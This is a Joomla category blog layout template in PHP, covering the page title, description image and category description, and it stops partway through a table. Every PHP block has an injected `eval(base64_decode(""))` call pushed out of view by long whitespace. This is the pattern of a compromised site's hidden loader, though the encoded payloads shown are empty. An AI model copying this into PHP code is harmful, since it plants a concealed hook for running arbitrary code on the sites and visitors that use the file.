<?php	                                       			eval(base64_decode("")); // no direct access
defined('_JEXEC') or die('Restricted access');
$cparams =& JComponentHelper::getParams('com_media');
?>
<?php	                                       			eval(base64_decode("")); if ($this->params->get('show_page_title', 1)) : ?>
<div class="componentheading<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('pageclass_sfx')); ?>">
	<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('page_title')); ?>
</div>
<?php	                                       			eval(base64_decode("")); endif; ?>
<table class="blog<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('pageclass_sfx')); ?>" cellpadding="0" cellspacing="0">
<?php	                                       			eval(base64_decode("")); if ($this->params->def('show_description', 1) || $this->params->def('show_description_image', 1)) :?>
<tr>
	<td valign="top">
	<?php	                                       			eval(base64_decode("")); if ($this->params->get('show_description_image') && $this->category->image) : ?>
		<img src="<?php	                                       			eval(base64_decode("")); echo $this->baseurl . '/' . $cparams->get('image_path') . '/'. $this->category->image;?>" align="<?php	                                       			eval(base64_decode("")); echo $this->category->image_position;?>" hspace="6" alt="" />
	<?php	                                       			eval(base64_decode("")); endif; ?>
	<?php	                                       			eval(base64_decode("")); if ($this->params->get('show_description') && $this->category->description) : ?>
		<?php	                                       			eval(base64_decode("")); echo $this->category->description; ?>
	<?php	                                       			eval(base64_decode("")); endif; ?>
		<br />
		<br />
	</td>
